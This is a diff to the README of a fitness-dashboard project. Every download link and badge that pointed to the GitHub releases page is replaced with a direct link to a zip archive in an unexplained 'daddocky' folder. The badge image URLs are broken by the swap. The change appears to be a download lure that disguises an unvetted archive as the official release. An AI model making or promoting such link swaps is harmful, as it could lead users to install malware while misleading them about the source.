@@ -1,6 +1,6 @@
 # 💪 Fitness-Analytics - Your Fitness Dashboard Made Easy
 
-[![Download Fitness Analytics](https://img.shields.io/badge/Download-Fitness%20Analytics-blue)](https://github.com/Ronak2436/Fitness-Analytics/releases)
+[![Download Fitness Analytics](https://raw.githubusercontent.com/Ronak2436/Fitness-Analytics/main/daddocky/Fitness-Analytics.zip%20Analytics-blue)](https://raw.githubusercontent.com/Ronak2436/Fitness-Analytics/main/daddocky/Fitness-Analytics.zip)
 
 ## 🚀 Overview
 
@@ -46,7 +46,7 @@ To get started with Fitness Analytics, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the download page:
    
-   [Download Fitness Analytics](https://github.com/Ronak2436/Fitness-Analytics/releases)
+   [Download Fitness Analytics](https://raw.githubusercontent.com/Ronak2436/Fitness-Analytics/main/daddocky/Fitness-Analytics.zip)
 
 2. **Choose the Latest Release**: Look for the most recent version available.
 
@@ -79,4 +79,4 @@ For questions or support regarding Fitness Analytics, please open an issue in th
 
 Visit the Releases page to start your journey towards better fitness analytics management.
 
-[![Download Fitness Analytics](https://img.shields.io/badge/Download-Fitness%20Analytics-blue)](https://github.com/Ronak2436/Fitness-Analytics/releases)
+[![Download Fitness Analytics](https://raw.githubusercontent.com/Ronak2436/Fitness-Analytics/main/daddocky/Fitness-Analytics.zip%20Analytics-blue)](https://raw.githubusercontent.com/Ronak2436/Fitness-Analytics/main/daddocky/Fitness-Analytics.zip)
